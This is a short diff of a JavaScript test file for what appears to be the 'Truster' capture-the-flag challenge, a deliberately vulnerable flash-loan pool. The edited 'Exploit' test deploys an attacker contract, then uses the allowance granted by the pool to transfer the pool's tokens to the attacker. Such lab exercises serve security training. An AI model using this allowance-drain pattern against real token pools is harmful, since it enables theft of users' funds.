@@ -37,11 +37,10 @@ contract('[Challenge] Truster', (accounts) => {
     it('Exploit', async function () {
         const AttackerContractFactory = artifacts.require('TrusterAttacker');
         const attackerContract = await AttackerContractFactory.new(this.token.address, this.pool.address, {from: attacker});
-        // single TX - bOOM CHAKALAKA!
+        // when
         await attackerContract.attack({from: attacker});
-        // const balance = await this.token.balanceOf(attacker);
-        // const allowance = await this.token.allowance(this.pool.address, attacker);
-        // console.log("Balance: ", {allowance: allowance.toString(), balance: balance.toString()});
+        const allowance = await this.token.allowance(this.pool.address, attacker);
+        await this.token.transferFrom(this.pool.address, attacker, allowance, {from: attacker});
     });
 
     after(async function () {
